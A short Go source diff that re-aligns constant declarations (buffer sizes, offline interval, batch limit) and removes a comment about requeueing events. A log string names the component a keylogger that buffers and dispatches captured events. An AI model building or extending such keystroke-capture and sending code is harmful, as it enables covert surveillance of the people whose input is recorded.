@@ -47,10 +47,10 @@ type Config struct {
 const (
 	defaultRequestTimeout = 10 * time.Second
 	defaultCadence        = 250 * time.Millisecond
-	defaultBufferSize    = 300
-	offlineBufferSize    = 5000
-	offlineInterval      = 15 * time.Minute
-	maxBatchEvents       = 2000
+	defaultBufferSize     = 300
+	offlineBufferSize     = 5000
+	offlineInterval       = 15 * time.Minute
+	maxBatchEvents        = 2000
 )
 
 var (
@@ -554,7 +554,6 @@ func (m *Manager) flushSession(sess *session, final bool) {
 		m.logf("keylogger: failed to dispatch events: %v", err)
 		if !final {
 			sess.mu.Lock()
-			// Requeue events for retry on next flush.
 			sess.buffer = append(envelope.Events, sess.buffer...)
 			sess.mu.Unlock()
 		}
